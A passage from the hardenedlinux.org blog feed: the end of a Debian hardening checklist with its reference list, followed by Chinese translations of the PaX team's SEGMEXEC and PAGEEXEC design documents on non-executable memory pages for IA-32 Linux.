&lt;/pre&gt;

&lt;p&gt;–[ 6. Security standard&lt;/p&gt;

&lt;p&gt;Well, there are a bunch of crazy security standards in the
planet. Some are compliance in some contries. FIPS-140-2/3, CC( EAL 7?
damn, it’d be an incarnation of the organge book;-)), PCI-DSS are very
popular terms you might hear from your security consultant. But… due
to lack of engineering implementation, these crazy( &amp;amp; creepy?)
security standards are not our concerns here.&lt;/p&gt;

&lt;p&gt;—-[ 6.1 STIGs for Debian&lt;/p&gt;

&lt;p&gt;Once there’s history, there’s story about offense &amp;amp; defense. Once
we’ve heard fascinating stories from Mr.Sn0wden about how NSA fuck the
world, there should be some open information about how BIG-BROTHER do
the defense. &lt;a href=&quot;http://iase.disa.mil/stigs/Pages/index.aspx&quot;&gt;STIGs&lt;/a&gt; is one of them.&lt;/p&gt;

&lt;p&gt;I think I’m not the right person to write this section…..plz &lt;a href=&quot;http://hardenedlinux.org/jekyll/update/2015/06/19/STIG-4-Debian.html&quot;&gt;check this out&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;–[ 7. Reference&lt;/p&gt;

&lt;p&gt;[1] Back To The Future: Unix Wildcards Gone Wild
    http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt&lt;/p&gt;

&lt;p&gt;[2] SYNPROXY
    http://lwn.net/Articles/563151/&lt;/p&gt;

&lt;p&gt;[3] DDoS protection Using Netfilter/iptables
    http://people.netfilter.org/hawk/presentations/devconf2014/iptables-ddos-mitigation_JesperBrouer.pdf&lt;/p&gt;

&lt;p&gt;[4] INTERNET PROTOCOL
    http://tools.ietf.org/html/rfc791&lt;/p&gt;

&lt;p&gt;[5] A simple TCP spoofing attack
    http://www.citi.umich.edu/u/provos/papers/secnet-spoof.txt&lt;/p&gt;

&lt;p&gt;[6] ICMP Attacks Illustrated
    http://www.sans.org/reading-room/whitepapers/threats/icmp-attacks-illustrated-477&lt;/p&gt;

&lt;p&gt;[7] SUSE Linux Enterprise Server 11 SP3 - Security and Hardening
    https://www.suse.com/documentation/sles11/singlehtml/book_hardening/book_hardening.html&lt;/p&gt;

&lt;p&gt;[8] Securing Debian Manual 
    https://www.debian.org/doc/manuals/securing-debian-howto/&lt;/p&gt;

&lt;p&gt;[9] A Brief Introduction to auditd
    http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/&lt;/p&gt;

&lt;p&gt;[10] Apparmor RBAC
     http://wiki.apparmor.net/index.php/Pam_apparmor_example&lt;/p&gt;

&lt;p&gt;[11] Hardening PHP from php.ini
     http://www.madirish.net/199&lt;/p&gt;

&lt;p&gt;[12] CVE-2014-0196 exploit
http://bugfuzz.com/stuff/cve-2014-0196-md.c&lt;/p&gt;

&lt;p&gt;[13] Secure Secure Shell
https://stribika.github.io/2015/01/04/secure-secure-shell.html&lt;/p&gt;

&lt;p&gt;[14] STIGs
     http://iase.disa.mil/stigs/Pages/index.aspx
     http://iase.disa.mil/stigs/os/unix-linux/Pages/index.aspx&lt;/p&gt;
</description>
        <pubDate>Wed, 10 Jun 2015 06:48:45 +0800</pubDate>
        <link>http://www.hardenedlinux.org/jekyll/update/2015/06/10/debian-security-chklist.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/jekyll/update/2015/06/10/debian-security-chklist.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>SEGMEXEC设计文档</title>
        <description>&lt;h2 id=&quot;segmexechttppaxgrsecuritynetdocssegmexectxt&quot;&gt;原文：&lt;a href=&quot;http://pax.grsecurity.net/docs/segmexec.txt&quot;&gt;SEGMEXEC设计文档&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;作者：The PaX team&lt;/p&gt;

&lt;p&gt;译者：n3o4po11o&lt;/p&gt;

&lt;h3 id=&quot;section&quot;&gt;1. 设计&lt;/h3&gt;

&lt;p&gt;SEGMEXEC的目标是通过IA-32构架CPU的内存分段实现不可执行页(Non-executable Page).&lt;/p&gt;

&lt;p&gt;在IA-32环境下,Linux运行在保护模式下并开启了内存分页。这意味着，所有访问内存的操作都必须经过两步的地址转换。第一步从指令中解码出逻辑地址并将其转换为线性地址（也就是我们常说的虚拟地址）.这个转换通过内存分段来完成，具体细节在另外的文档进行描述。&lt;/p&gt;

&lt;p&gt;由于Linux高效地通过不使用分段而是通过分别为代码和数据的访问创建基址为0，段界限为4GB的内存段（因此，逻辑地址和线性地址一致），这使得通过设置段来实现不可执行页成为了可能。&lt;/p&gt;

&lt;p&gt;基本的思路是将3GB用户态的线性地址空间平均分成两半，其中一半用来放置数据的映射（那就是我们定义了一个可以涵盖0-1.5GB范围的线性地址的数据段描述符），而另外一半用来放置代码的映射（那就是我们定义了一个可以涵盖1.5-3GB范围的线性地址的代码段描述符）。由于一个可执行的映射也可以用来进行数据的存取。我们必须保证这样的映射对两个段都可见，在两个段中相对应的地址都有这些数据的映射。这样的设置会在取指令时将数据存取的操作分离开来。因此能够基于访问的类型进行控制或者干预。而当一个只会出现在0-1.5GB线性地址范围的数据，有了试图执行的行为，就会抛出页错误（page fault, PF）&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;2. 实现&lt;/h3&gt;

&lt;p&gt;SEGMEXEC的核心为虚拟内存空间镜像（vma mirroring），其具体细节在单独的&lt;a href=&quot;https://pax.grsecurity.net/docs/vmmirror.txt&quot;&gt;文件&lt;/a&gt;中进行讨论.可执行文件映射的镜像除了有RANDEXEC的情况下，是通过do_mmap()（位于include/linux/mm.h）来完成的。do_mmap()是用户态和内核态用来发起映射请求的函数。&lt;/p&gt;

&lt;p&gt;这样特殊的代码段描述符和数据段描述符放置在arch/i386/kernel/head.S中一个叫做gdt_table2的新全局描述符表(Global Descriptor Table)中。另外的全局描述表存在有两个原因：第一是为了简化实现，这样的话用户态的CS/SS选择器就不需要有任何改变；第二是能够防止在单独一个全局描述表中简单的通过滥用retf或者其他指令打破SEGMEXEC中受限制的代码段的攻击。而GDT保存的用户态的代码/数据描述符与SEGMEXEC事务中的不一致。我们必须对/arch/i386/kernel/process.c中对底层内容进行转换代码的__switch_to()函数以及在fs/bin/fmt_elf.c(其在用户态中对可执行文件的执行进行初始准备)中的local_elf_binary()函数的最后一步进行修改。&lt;/p&gt;

&lt;p&gt;全局描述符表拥有在运行时进行设置的高级电源管理特定的描述符，而这些描述符也必须传递给第二个全局描述符表（通过arch/i386/kernel/apm.c）。最后，原有的全局描述符表必须将储存的每个CPU任务状态描述符(TSS)与本地描述符表描述符与第二个全局描述符表进行同步。（通过arch/i386/kernel/traps.c中的set_tss_desc()与set_ldt_desc()函数来完成）&lt;/p&gt;

&lt;p&gt;由于内核允许用户态在本地描述符表中自己定义代码段描述符，我们必须将这个功能
禁止，防止用来打破激活SEGMEXEC下代码段的限制。（通过arch/i386/kernel/ldt.c中
的write_ldt()进行额外的检查）&lt;/p&gt;
</description>
        <pubDate>Tue, 26 May 2015 13:05:05 +0800</pubDate>
        <link>http://www.hardenedlinux.org/jekyll/update/2015/05/26/segmexec.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/jekyll/update/2015/05/26/segmexec.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>PAGEEXEC的最早设计文档</title>
        <description>&lt;p&gt;Shawn：事实证明对性能影响很大，在之后的一些年里SEGEXEC用的更多，但
PAGEXEC让我们明白了初始的PaX feature到底是什么样的一个东东，不了解你
hacking领域历史的人永远无法去解决未来所要面对的问题，过去的15年里系统安
全经历了有趣的进化，关于进攻阵营介绍已经够多了（或许我们未来可以花些时
间聊聊），Aleph One也是名利双收。&lt;/p&gt;

&lt;p&gt;在防御的这一方，虽然PaX/Grsecurity对整个内核安全造成了巨大影响和冲击，
但The PaX team和Spender并未从中赚取哪怕1美分，而PAGEEXEC是
PaX/Grsecurity的alpha，我们不知道哪个feature会成为omega，但至少我们可以
借助PaX team的这篇文档对那个0ld g00d h4ck1ng days的年代有一些回顾。&lt;/p&gt;

&lt;h2 id=&quot;pageexechttpspaxgrsecuritynetdocspageexecoldtxt&quot;&gt;原文：&lt;a href=&quot;https://pax.grsecurity.net/docs/pageexec.old.txt&quot;&gt;PAGEEXEC的最早设计文档&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;作者：The PaX team&lt;/p&gt;

&lt;p&gt;译者：Shawn the R0ck&lt;/p&gt;

&lt;h3 id=&quot;abstract&quot;&gt;0. abstract&lt;/h3&gt;

&lt;p&gt;这篇文档讨论在IA-32处理器上实现不可执行（比如用户态代码所在的页只有读和
写的权限，但没有执行的权限）。因为处理器的原生页表和页目录不提供这样的
功能，所以这个实现有一定的难度。&lt;/p&gt;

&lt;p&gt;这个设计的想法是源于Kevin Lawton, Ramon van Handler和其他为plex86项目贡
献的人（看footnote 1）。&lt;/p&gt;

&lt;h3 id=&quot;intro&quot;&gt;1. intro&lt;/h3&gt;

&lt;p&gt;联网计算机的安全是最近每天都在讨论的议题。很多安全问题都是归结于一种基
于缓冲区利用的特的攻击技术，这类攻击都依赖于应用程序内部不恰当的数据处
理（看footnote 2）。&lt;/p&gt;

&lt;p&gt;大部分的攻击都是程序错误的数据处理导致执行攻击者的代码（就如程序自己执
行一样），这个影响允许攻击者去执行任何的操作而应用程序也会允许攻击者的
代码这么干。&lt;/p&gt;

&lt;p&gt;这是一个非常糟糕的事情，必须得想法修复掉。最直观的解决这个问题的方法当
然是修复现有的漏洞和保证新的代码在设计和实现时的质量（完美程序员模式）。&lt;/p&gt;

&lt;p&gt;但是人类总是会犯错，现在已经有几种对抗缓冲区溢出的方法，其中的一个就是
不可执行的页，这也是能根除原本应该是数据的页但用于执行的可能性（在一个
典型的缓冲区溢出的场景是数组保存在栈上）。&lt;/p&gt;

&lt;p&gt;有一些处理器支持给页标注为只能执行（vs. 数据读/写），但不幸的是IA-32类
的CPU不支持（Intel, Amd, etc)。&lt;/p&gt;

&lt;h3 id=&quot;the-idea&quot;&gt;2. the idea&lt;/h3&gt;

&lt;p&gt;1999年7月，plex86(后来的freemware)项目在一些来自互联网用户的帮助下开始
了针对IA-32处理器的一个特性（一些人认为是一个bug，尽管后来成为了拯救者）
进行了测试。&lt;/p&gt;

&lt;p&gt;这个特性依赖于Pentium处理器和更新的处理器的TLB（translation lookaside
buffer)是区分数据TLB（DTLB）和指令TLB（ITLB）的。TLBs作为PTEs(page
table entries，页表条目)的缓存，因此保存着user/supervisor(用户和管理员）
受访问的权限。通常情况下ITLB和DTLB条目（对于特定的线性/物理地址对）是加
载于同样的PTE，因此他们包含了一致的状态。&lt;/p&gt;

&lt;p&gt;plex86社区想要测试是否能让DTLB和ITLB的条目产生不一样的状态。他们当时有
兴趣看看在一个只允许代码执行的页上去做数据读写造成的页错误( page
fault, PF），因为允许类似自修改代码的检测对于虚拟化来说是重要的特性。&lt;/p&gt;

&lt;p&gt;然后这个机制可以导致另一种不一致的状态，即只允许读和写，而代码执行是被
禁止的；这正是对抗基于缓冲区溢出所需要的。&lt;/p&gt;

&lt;p&gt;他们的测试被证实是成功的（看footnote 3)&lt;/p&gt;

&lt;h3 id=&quot;the-theory&quot;&gt;3. the theory&lt;/h3&gt;

&lt;p&gt;PTE和TLB管理是内核内存管理子系统的功能，因此实现不可执行的页必须是改动
内核本身，这个章节我们将会描述在实现过程中哪些地方需要处理，之后会谈谈
在Windows NT/2000和Linux内核里的实现，因为Windows的源代码和底层系统相关
的一些文档并不能以公开的渠道获取，我们将会涉足一些逆向工程（希望微软会
把这个安全机制在未来的NT系统中加入）。&lt;/p&gt;

&lt;p&gt;一个不可执行的页需要在TLB里创建和维护一组特殊的状态，这些状态信息用于表
示对于特定的页的TLB信息，看下图：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                          ITLB

                           - | S | U
                          -----------
                 D     - | 0 | 1 | 2 |
                 T        -----------
                 L     S | 3 | 4 | 5 |
                 B        -----------
                       U | 6 | 7 | 8 |
                          -----------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;TLB要么没有任何对应线性/物理地址对( - )的条目，要么有一个条目指向用户
（U）或者管理员（S）的访问权限。&lt;/p&gt;

&lt;p&gt;注意，通常情况下状态5和7从来不会发生（他们都是不一致的状态）。&lt;/p&gt;

&lt;p&gt;任何页的初始状态都是0，当处理器访问了页（指令fetch或者数据读写操作），
状态就开始有所变化。一般的可能的状态转换如下面所示：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    0 -&amp;gt; 1 (ITLB fill, PTE specifies Supervisor rights)
    0 -&amp;gt; 2 (ITLB fill, PTE specifies User rights)
    3 -&amp;gt; 4 (ITLB fill, PTE specifies Supervisor rights)
    3 -&amp;gt; 5 (ITLB fill, PTE specifies User rights)      
    6 -&amp;gt; 7 (ITLB fill, PTE specifies Supervisor rights)
    6 -&amp;gt; 8 (ITLB fill, PTE specifies User rights)      

    0 -&amp;gt; 3 (DTLB fill, PTE specifies Supervisor rights)
    0 -&amp;gt; 6 (DTLB fill, PTE specifies User rights)      
    1 -&amp;gt; 4 (DTLB fill, PTE specifies Supervisor rights)
    1 -&amp;gt; 7 (DTLB fill, PTE specifies User rights)      
    2 -&amp;gt; 5 (DTLB fill, PTE specifies Supervisor rights)
    2 -&amp;gt; 8 (DTLB fill, PTE specifies User rights) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;另外一半可能的状态转换刚好和上面的状态转换方向相反（用于表示冲刷到期的
TLB条目）以及下面两个：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    4 -&amp;gt; 0 (显式调用TLB flush指令)
    8 -&amp;gt; 0 (显式调用TLB flush指令)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;读到这里，仔细的读者可能已经发现没有在S和U状态之间的直接转换。因为在这
里我们不讨论直接通过MSRs的方式操作TLB页表的方式。如果内核直接操作TLB条
目，那么额外的状态转换必须考虑。&lt;/p&gt;

&lt;p&gt;有了以上的信息，我们可以定义什么“好”和“坏”的状态以及状态转换了，之后可
以决定怎么进入和维护仅仅是“好”的状态。&lt;/p&gt;

&lt;p&gt;不违反在一个页上“不可执行”的特性时被称为“好”状态，“好”状态如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    0,3,6: 由于没有ITLB条目所以无法取指令，所以没有代码可以在这种页
           上执行

    1,4,7: 用户态代码（一个执行线程的CPL（当前权限）为3）可以在这些
           页上导致一个页错误，所以内核可以做相应的动作
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注意，初始状态（0）是一个“好”状态，我们仅会去保证不会有转换到“坏”状态。&lt;/p&gt;

&lt;p&gt;一个好的状态转换是转换到一个”好“状态（坏的状态转换是导致最终转换到了”坏
“状态），我们的目标是维护一个”好“状态，因此我们想当”坏“状态转换发生时收
到通知（然后去阻止它）。但并没有办法通过一个TLB条目的冲刷收到通知（过期
冲刷或者显式调用），我们从现在开始不应该考虑这个问题（除了5 -&amp;gt; 2和8 -&amp;gt;
2，这2个状态初始时就已经是“坏”状态了“，这种情况尽量在设计时考虑不要让它
们发生，请看关于paranoid security的footnote）。&lt;/p&gt;

&lt;p&gt;“好”的状态转换如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    0 -&amp;gt; 1
    3 -&amp;gt; 4
    6 -&amp;gt; 7
    0 -&amp;gt; 3
    0 -&amp;gt; 6
    1 -&amp;gt; 4
    1 -&amp;gt; 7
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;“坏”的状态转换如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    0 -&amp;gt; 2
    3 -&amp;gt; 5
    6 -&amp;gt; 8
    2 -&amp;gt; 5
    2 -&amp;gt; 8
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注意，最后2个“坏”状态转换的初始状态就是“坏”的（这种情况在我们的设计里要
避免）。如何对待它们取决于我们对安全有多被害妄想症结（我们有多信任我们
的实现，内核完整性等问题）。在接下来的讨论中，我们不会把这2种状态转换纳
入考虑（因此也不会有针对的防御机制），我们仅会指出它们会影响设计和实现
的哪些方面。这些问题让我们本质上要做一个性能 vs. (被害妄想症)安全的决定。&lt;/p&gt;

&lt;p&gt;现在我们可以把注意力转移到如何检测在用户空间里“坏”状态转换的尝试上，如
果我们可以让转换时触发处理器中断的正常流程，那应该可以做到检测。达到这
个目的唯一的途径是在相应的转换时触发一个页错误，每个可能的”坏“状态转换
大致如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; 0 -&amp;gt; 2, 3 -&amp;gt; 5, 6 -&amp;gt; 8:

    - 一个PTE（页目录条目）的P( Present)位不设置（PTE.NP）。当任何
      代码导致ITLB从这个PTE读取时，我们能获得一个页错误。

    - 一个PTE的U/S（User/Supervisor）位设置到S（PTE.S）。当用户态代
      码导致ITLB从这个PTE读取时，我们能获取到一个页错误。

 2 -&amp;gt; 5, 2 -&amp;gt; 8:

    - 一个PTE（页目录条目）的P( Present)位不设置（PTE.NP）。当任何
      代码导致ITLB从这个PTE读取时，我们能获得一个页错误。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;不论我们如何选择，我们都必须先了解对于不同方式实现”好“状态转换的不同影
响：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; - PTE.NP方式的状态转换会导致正常情况下不会造成的额外页错误

 - PTE.S会消除掉一些转换，也会造成额外的页错误
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面这个表描述了当被内核态和用户态代码触发时上述选择可以造成的“好”转换：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; trans | choice: PTE.NP          PTE.S
 ition | mode:   S     U         S     U
 -------------------------------------------------------------------
 0 -&amp;gt; 1:         PF    PF        none  PF (transformed from 0 -&amp;gt; 2)
 3 -&amp;gt; 4:         PF    PF        none  PF (transformed from 3 -&amp;gt; 5)
 6 -&amp;gt; 7:         PF    PF        none  PF (transformed from 6 -&amp;gt; 8)
 0 -&amp;gt; 3:         PF    PF        none  PF
 0 -&amp;gt; 6:         PF    PF        n/a   n/a (transformed into 0 -&amp;gt; 3)
 1 -&amp;gt; 4:         PF    n/a       none  n/a
 1 -&amp;gt; 7:         PF    n/a       none  n/a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从这里我们可以看出的确得在性能与安全之间做出决定，如果我们继续选择被害
妄想症模式，唯一的选择就是PTE.NP，不幸的是这个模式产生更多的页错误会对
系统的性能有很大的影响，还必须对现有的内核页管理系统进行大规模修改，特
别是针对基于页文件（swap）的虚拟内存管理的部分，而U/S位通常没有太大性能
影响。&lt;/p&gt;

&lt;p&gt;总结一下这个章节，陈述一个不可执行的页必须实现哪些部分：&lt;/p&gt;

&lt;h3 id=&quot;usspte&quot;&gt;3.1. 创建U/S位为S的PTE页。&lt;/h3&gt;

&lt;h3 id=&quot;ptepteuss&quot;&gt;3.2. 在PTE的生命周期里，保持PTE的U/S位始终设置为S。&lt;/h3&gt;

&lt;h3 id=&quot;section&quot;&gt;3.3. 扩展页错误处理到&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt; - 当“坏”转换发生时处理页错误（记得有些转换是被某些转换给重定向的）：


    0 -&amp;gt; 1:
    3 -&amp;gt; 4:
    6 -&amp;gt; 7:

           终止尝试在被标为不可执行的页上执行代码的用户线程，具体的
           操作可以更细粒度的给人类用户或者其他程序选择的提示，当然
           不排除有人乐意在繁忙的web服务器上点击yes/no按钮... ;-)


  - 当“好”转换发生时处理页错误：

    0 -&amp;gt; 3:
            
	正常数据访问页时从状态转换0 -&amp;gt; 6（栈操作，堆访问等）重
	定向过来的，这必须得保证处理的速度足够快：

            - 为这个页冲刷TLBs（x86指令：invlpg）
            - 从PTE.S改变为PTE.U
            - 访问页，以用户权限加载DTLB
            - 把PTE.U变回PTE.S（按照3.2的要求）
	- 恢复用户线程
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;得区分不同的原因导致的页错误，处理程序必须判断错误代码（去判断是否是
PTE.S或者其他原因导致的页错误）然后对比错误地址（寄存器CR2）和导致错误
的指令地址（存储在栈上的EIP），然后判断是否一致（“坏”转换尝试）或者不一
致。&lt;/p&gt;

&lt;p&gt;最后一个需要讨论的问题是关于多CPU环境。幸运的是，并没有太多需要担心的。
只有一种情况多CPU可能是个问题，就是当页错误处理程序尝试以用户权限加载
DTLB的同一时间段里违反了3.2，如果PTEs是在多CPU间共享的话，我们必须阻止
其他CPU加载ITLB，这里也有关于带来的性能问题考量：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    - 对于正在处理错误的CPU我们可以切换到一个新的私有页目录和修改或
      者使用一个私有的PTE拷贝。这个方法会冲刷整个TLBs（劣势），虽然为全局页
      保持了条目，但并不需要在CPU间进行任何同步操作（优势）。

    - 拖延其他CPU的执行，修改或者使用共享的PTE。这个方法除了对于刻
      意操作的DTLB条目外不影响TLBs（优势），但需要CPU间的同步操作
      （劣势）。

    - 不拖延其他CPU去修改或者使用共享的PTE。这种方法除了对于可以操
      作的DTLB条目外不影响TLBs（优势），也不要求CPU间进行同步（优
      势），但留了很小的时间窗口可能让PTE加载到不应该加载的处理器的
      ITLB里（劣势）。
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;linux-implementation&quot;&gt;4. Linux implementation&lt;/h3&gt;

&lt;p&gt;虚拟内存管理系统的核心数据结构vm_area_struct在include/linux/mm.h里声明
的，这个数据结构描述了一个任务的连续（在线性地址空间）页共享的相同的属
性（可读，可写，可执行，共享/私有，etc）。我们对两个字段有兴趣：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   vm_flags:
   决定了页能做的事情范围的flags（读/写/执行），修改后对于当前
   任务是否保持私有拷贝（COW激活），或者与其他任务共享到相同的
   范围（共享内存），有一些flags对于我们的讨论并不重要（看
   footnote 4）

   vm_page_prot:
   这些flags是在物理内存被分配到给定的内存范围时实际放进PTE的
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从vm_flags到vm_page_prot的转换是被一个被称为protection_map[]的简单数组
描述，定义在mm/mmap.c文件里。这是与硬件架构无关的分页子系统，但实际的符
号是使用来自特定架构的包含文件，IA-32是在include/asm-i386/pgtable.h。&lt;/p&gt;

&lt;p&gt;在我们的实现里，我们有意打破现有的代码风格去重命名一些常量（有时是增
加），所以程序员在未来应该显式的声明是否他们需要可执行的内存。&lt;/p&gt;

&lt;p&gt;下一步是去扩展页错误处理程序，首先是特定架构本身，对于IA-32是存放在
arch/i386/mm/fault.c里的do_page_fault()。&lt;/p&gt;

&lt;p&gt;页错误可能因为不同的原因被触发，为了加速处理过程IA-32处理器放了一个特殊
格式的错误代码在栈上作为附加的异常处理程序的栈帧。页错误处理程序跟处理
器相关的部分根据错误代码和内存范围包含的错误地址的vm_flags来做出决定(当
然不是所有页错误都发生在映射的内存里，但我们暂时不考虑它们）。&lt;/p&gt;

&lt;p&gt;错误代码如下（也请查阅footnote 5）：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; 名字           可能性
 -------------------------------------------------------------------------
 原因           PTE不是present(PTE.NP)

                用户空间代码违反权限(PTE.S)

                尝试写入只读或者COW页(PTE.R)


 读或写尝试     错误的指令获取尝试R/W
 
 管理员或者     错误指令在用户模式执行(CPL=3)，或者在管理员模式(CPL=0)
 用户模式
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接下来我们得决定针对不同原因产生错误时处理程序的操作，之后得定义我们的
方案（PTE.S）怎么去修改他们，下面的表里包含了所有老的和新的处理程序：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; legend:

   vm_flags: flags in vm_flags (仅4个最低有效位)

   pte:      针对特定vm_flags的pte里的flags (仅3个最低有效位)

   err:      pte flags的可能错误代码 (仅3个最低有效位)

   action:   sigbus (np): signal task （访问非Present的页)
             sigbus (w):  signal task （尝试写只读的页）
             cow:         处理 copy-on-write
             emu:         模拟PTE.U以及允许访问
             emu/kill:    检查访问是否合法(emu)或者不合法(kill)


 vm_flags   原始pte错误动作         PaX的pte错误动作
 ------------------------------------------------------
 0000       000 xx0 sigbus (np)     000 xx0 sigbus (np)
 0001       101 x11 sigbus (w)      001 011 sigbus (w)
                                        111 sigbus (w)
                                        101 emu/kill
 0010       101 x11 cow             001 011 cow
                                        111 cow
                                        101 emu/kill
                                    011 111 emu
 0011       101 x11 cow             001 011 cow
                                        111 cow
                                        101 emu/kill
                                    011 111 emu

 0100       101 x11 sigbus (w)      101 011 sigbus (w)
 0101       101 x11 sigbus (w)      101 011 sigbus (w)
 0110       101 x11 cow             101 011 cow
 0111       101 x11 cow             101 011 cow

 1000       000 xx0 sigbus (np)     000 xx0 sigbus (np)
 1001       101 x11 sigbus (w)      001 011 sigbus (w)
                                        111 sigbus (w)
                                        101 emu/kill
 1010       111 cannot fault        011 101 emu/kill
                                        111 emu
 1011       111 cannot fault        011 101 emu/kill
                                        111 emu

 1100       101 x11 sigbus (w)      101 011 sigbus (w)
 1101       101 x11 sigbus (w)      101 011 sigbus (w)
 1110       111 cannot fault        111 cannot fault
 1111       111 cannot fault        111 cannot fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面的表显示了相同的信息（为PaX），但对于程序员更适合的格式：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; vm_flags| err
         | 000 001 010 011 100 101 110 111
 ---------------------------------------------
 0000      sig     sig     sig     sig
 0001                  sig     e/k     sig
 0010                  cow     e/k     cow/emu
 0011                  cow     e/k     cow/emu

 0100                  sig
 0101                  sig
 0110                  cow
 0111                  cow

 1000      sig     sig     sig     sig
 1001                  sig     e/k     sig
 1010                          e/k     emu
 1011                          e/k     emu

 1100                  sig
 1101                  sig
 1110
 1111
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;现在我们创建了新的页错误处理程序，让我们多少讨论一下Linux内核相关的问题，
比如PaX的副作用。首先是当前的可执行的栈（也可以说是被滥用的…）就这样
被干掉了，我们的改动影响了信号处理（比如return-from-sig-handling代码被
放到了用户空间的栈）和trampolines(GCC扩展）。&lt;/p&gt;

&lt;p&gt;在当前的实现中我们决定只解决之前（可能会有更严重的问题）问题，处理
trampolines还是留给别人吧（在注重安全的环境中这种代码本来就不应该允许执
行）。&lt;/p&gt;

&lt;p&gt;幸运的是，这些放在用户模式栈的代码都是固定的长度/内容，因此我们所需要做
的只是检查代码pattern。一个需要注意的地方是：这些检测尝试去的内存可能在
页上而非错误的指令，我们用了一个小技巧在代码拷贝到用户态栈（读者被邀请
去做做数学）之前去改变对齐。&lt;/p&gt;

&lt;p&gt;考虑到还有正常的可执行栈的使用，内核可以分配一个（可执行）页然后映射到
每个任务的地址空间（“浪费”了4kb的内存）。&lt;/p&gt;

&lt;p&gt;第2个问题（不算针对Linux）是PaX的性能损耗，我们有坏消息和好消息。其中能
猜到的是，越大和越高效的TLB会产生越少的页错误。在标准的IA-32处理器上，
TLBs看起来拥有64到256个条目（看footnote 6），他们至少4-way associative
（Shawn：暂时翻译成4组相连，如果每组是8个条目那4组是32个条目），或者全
部关联。这个意思是针对在至少1个TLB条目上的不同的页最多访问256次后必须让
其过期（打开了一扇通向潜在页错误的未来之门）。下面一个简单的测试程序能
看出PaX的性能影响。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  #include &amp;lt;stdio.h&amp;gt;

  int main()
  {
    char* buf;
    int i,j;

    buf = (char*)malloc(4096*257);
    for (j=0; j&amp;lt;100000; j++) {
      for (i=0; i&amp;lt;257; i++) {
        buf[i*4096] = 'a';
      }
    }
    return (0);
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在标准的Linux内核2.2.14上和打了PaX补丁的2.2.17内核上的测试结果如下：&lt;/p&gt;

&lt;p&gt;6.20user 0.01system 0:06.21elapsed 100%CPU (0avgtext+0avgdata 0maxresident)k
   0inputs+0outputs (77major+266minor)pagefaults 0swaps&lt;/p&gt;

&lt;p&gt;6.15user 29.74system 0:35.89elapsed 99%CPU (0avgtext+0avgdata 0maxresident)k
   0inputs+0outputs (77major+266minor)pagefaults 0swaps&lt;/p&gt;

&lt;p&gt;意料之中，PaX内核的额外页错误处理导致了一些性能下降（没有免费午餐）。好
消息是在真实世界的测试中性能损耗通常小于5–8%…..&lt;/p&gt;

&lt;h3 id=&quot;windows-nt2000-implementation&quot;&gt;5. Windows NT/2000 implementation&lt;/h3&gt;

&lt;p&gt;不辛的是，由于缺乏时间/心情/etc，我们不打算为Windows实现，有兴趣的读者
可以联系Ice (white_ice@usa.net)或者fOSSiL &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#102;&amp;#111;&amp;#115;&amp;#115;&amp;#097;&amp;#104;&amp;#064;&amp;#117;&amp;#115;&amp;#097;&amp;#046;&amp;#110;&amp;#101;&amp;#116;&quot;&gt;&amp;#102;&amp;#111;&amp;#115;&amp;#115;&amp;#097;&amp;#104;&amp;#064;&amp;#117;&amp;#115;&amp;#097;&amp;#046;&amp;#110;&amp;#101;&amp;#116;&lt;/a&gt;去做一些逆向
工程，设计和实现的工作&lt;/p&gt;

&lt;p&gt;给那些打算单干的路标：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   - 逆向工程工具IDA (the Interactive DisAssembler,
     http://www.datarescue.com). the next source of information is
     the symbol files available at the Customer Support
     Diagnostics page
     (http://www.microsoft.com/WINDOWS2000/downloads/ Other
     Downloads section has the link)

   - the following symbols are probably worth a look:
       - _MmUserProtectionToMask1, _MmUserProtectionToMask2
       - @KiFlushSingleTb@8, @KeFlushSingleTb@20
       - @MiDetermineUserGlobalPteMask@4, @MiMakeProtectionMask@4
       - _MmProtectToPteMask, _MmProtectToValue

   - 实现应该在让内核模式驱动（KMD）在启动时加载，大概也必须做一些
     运行时的内核patching，这些工作难度不低（想想SMP的场景）

   - 注意PAE和PSE
